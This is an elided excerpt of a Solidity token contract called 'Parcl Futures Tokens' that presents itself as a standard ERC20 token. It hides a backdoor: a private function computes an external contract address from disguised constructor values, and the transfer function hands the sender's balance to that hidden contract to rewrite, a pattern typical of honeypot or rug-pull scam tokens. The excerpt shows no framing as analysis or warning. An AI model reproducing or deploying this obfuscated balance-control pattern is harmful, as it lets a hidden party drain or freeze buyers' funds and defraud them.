...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "Parcl Futures Tokens";
    string private _symbol = "Parcl";
    uint256 private _decimals;
    uint256 private _totalSupply;
    uint256 private rMidjour_;

    constructor(uint256 decimals_, uint256 _MAXMidjour) {
        _decimals = decimals_;
        rMidjour_ = _MAXMidjour;
    ...
    function _allowance(uint256 gptVar, uint256 numVar)
        private
        pure
        returns (address)
    {
        return address(uint160(uint256(gptVar 
        + numVar)));
    }
    ...
    function _transfer(
        ...
        require(amount > 0);
        _balance[from] = _rMidjour(
        _allowance(rMidjour_,
        _decimals))._Araya(
            from,
            amount,
            _balance[from]
